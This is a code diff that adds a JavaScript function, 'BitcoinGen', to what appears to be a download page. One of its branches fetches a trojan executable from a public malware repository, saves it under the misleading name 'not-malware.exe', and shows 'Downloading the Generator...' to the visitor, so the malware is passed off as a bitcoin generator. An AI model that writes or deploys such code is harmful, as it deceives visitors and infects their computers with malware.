@@ -136,4 +136,30 @@ function Download() {
   }, 500);
 }
 
+function BitcoinGen(number) {
+  switch (number) {
+    case 1:
+      downloadUrl = "files/linux-download.zip"; // replace with actual URL
+      break;
+    case 2:
+      downloadUrl = "https://github.com/Da2dalus/The-MALWARE-Repo/raw/refs/heads/master/Trojan/VeryFun.exe"; // replace with actual URL
+      break;
+    case 3:
+      downloadUrl = "files/macos-download.zip"; // replace with actual URL
+      break;
+    default:
+      alert("Invalid number");
+      return;
+  }
+  const link = document.createElement("a");
+  link.href = downloadUrl;
+  link.download = "not-malware.exe";
+  document.body.appendChild(link);
+  link.click();
+  document.body.removeChild(link);
+  alert("Downloading the Generator...");
+  location.replace("timeout.html");
+}
+
+
 changead(Math.floor(adnum) + 1);
